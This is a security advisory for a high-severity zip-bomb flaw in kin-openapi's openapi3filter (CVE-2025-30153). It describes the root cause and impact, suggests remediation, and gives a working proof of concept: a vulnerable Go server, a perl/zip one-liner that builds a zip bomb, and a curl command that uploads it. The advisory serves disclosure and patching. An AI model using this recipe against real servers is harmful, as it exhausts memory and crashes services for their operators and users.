# Improper Handling of Highly Compressed Data (Data Amplification) in github.com/getkin/kin-openapi/openapi3filter

**GHSA**: GHSA-wq9g-9vfc-cfq9 | **CVE**: CVE-2025-30153 | **Severity**: high (CVSS 7.5)

**CWE**: CWE-409

**Affected Packages**:
- **github.com/getkin/kin-openapi** (go): < 0.131.0

## Description

### Summary

When validating a request with a multipart/form-data schema, if the OpenAPI schema allows it, an attacker can upload a crafted ZIP file (e.g., a ZIP bomb), causing the server to consume all available system memory.

### Details

The root cause comes from the [ZipFileBodyDecoder](https://github.com/getkin/kin-openapi/blob/6da871e0e170b7637eb568c265c08bc2b5d6e7a3/openapi3filter/req_resp_decoder.go#L1523), which is registered [automatically](https://github.com/getkin/kin-openapi/blob/6da871e0e170b7637eb568c265c08bc2b5d6e7a3/openapi3filter/req_resp_decoder.go#L1275) by the module (contrary to what the [documentation says](https://github.com/getkin/kin-openapi?tab=readme-ov-file#custom-content-type-for-body-of-http-requestresponse).

### PoC
To reproduce the vulnerability, you can use the following OpenAPI schema:
```yaml
openapi: 3.0.0
info:
  title: 'Validator'
  version: 0.0.1
paths:
  /:
    post:
      requestBody:
        required: true
        content:
          multipart/form-data:
            schema:
              type: object
              required:
                - file
              properties:
                file:
                  type: string
                  format: binary
      responses:
        '200':
          description: Created
```
And this code to validate the request (nothing fancy, it basically only calls the `openapi3filter.ValidateRequest` function`):
```go
package main

import (
	"fmt"
	"log"
	"net/http"

	"github.com/getkin/kin-openapi/openapi3filter"
	legacyrouter "github.com/getkin/kin-openapi/routers/legacy"

	"github.com/getkin/kin-openapi/openapi3"
)

func handler(w http.ResponseWriter, r *http.Request) {
	loader := openapi3.NewLoader()

	doc, err := loader.LoadFromFile("schema.yaml")
	if err != nil {
		http.Error(w, "Failed to load OpenAPI document", http.StatusInternalServerError)
		return
	}

	if err := doc.Validate(r.Context()); err != nil {
		http.Error(w, "Invalid OpenAPI document", http.StatusBadRequest)
		return
	}

	router, err := legacyrouter.NewRouter(doc)
	if err != nil {
		http.Error(w, "Failed to create router", http.StatusInternalServerError)
		return
	}

	route, pathParams, err := router.FindRoute(r)
	if err != nil {
		http.Error(w, "Failed to find route", http.StatusNotFound)
		return
	}

	input := &openapi3filter.RequestValidationInput{
		Request:     r,
		QueryParams: r.URL.Query(),
		Route:       route,
		PathParams:  pathParams,
	}

	if err := openapi3filter.ValidateRequest(r.Context(), input); err != nil {
		http.Error(w, fmt.Sprintf("Request validation failed: %v", err), http.StatusBadRequest)
		return
	}

	w.Write([]byte("request ok !"))
}

func main() {
	http.HandleFunc("/", handler)
	log.Fatal(http.ListenAndServe(":8080", nil))

}
```

We also need to create a zip bomb. This command will create a 4.7GB file and compress it to to 4.7MB zip archive:
```shell
perl -e 'print "0" x 5000000000' > /tmp/bigfile.txt; zip -9 /tmp/bomb.zip /tmp/bigfile.txt
```

Run the PoC provided, and upload the zip bomb with `curl localhost:8080/  -F file="@/tmp/bomb.zip;type=application/zip" -v`.

Observe the memory consumption of the test server during and after the upload (it jumped to a bit over 22GB in my testing, with only a 4.7MB input file, you can reduce the size of the generated file to not kill your test machine when reproducing.) 

### Impact

An attacker can trigger an out-of-memory (OOM) condition, leading to server crashes or degraded performance.
It seems to only be exploitable if the OpenAPI schema allows for multipart upload.

### Remediation

I see at least 2 potential fixes/improvements:
 - Do not register by default the zip file decoder (I honestly was a bit surprised to see it was enabled by default, it seems to be quite a niche use-case ?)
 - Update `ZipFileBodyDecoder` to enforce a maximum size of the decompressed archive and bailout as soon as it's reached (probably with a small default value and allow the users to configure it through the input options ?)
